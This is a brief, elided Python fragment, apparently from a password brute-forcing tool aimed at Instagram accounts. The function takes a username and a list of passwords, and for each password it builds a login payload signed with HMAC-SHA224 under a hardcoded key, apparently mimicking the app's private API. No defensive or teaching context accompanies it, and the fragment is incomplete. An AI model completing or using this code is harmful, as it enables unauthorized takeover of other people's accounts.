...
def i_insta(username, password):
    ...
    for pw in password:
        try:
            ...
            param  = hmac.new('46024e8f31e295869a0e861eaed42cb1dd8454b55232d85f6c6764365079374b'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
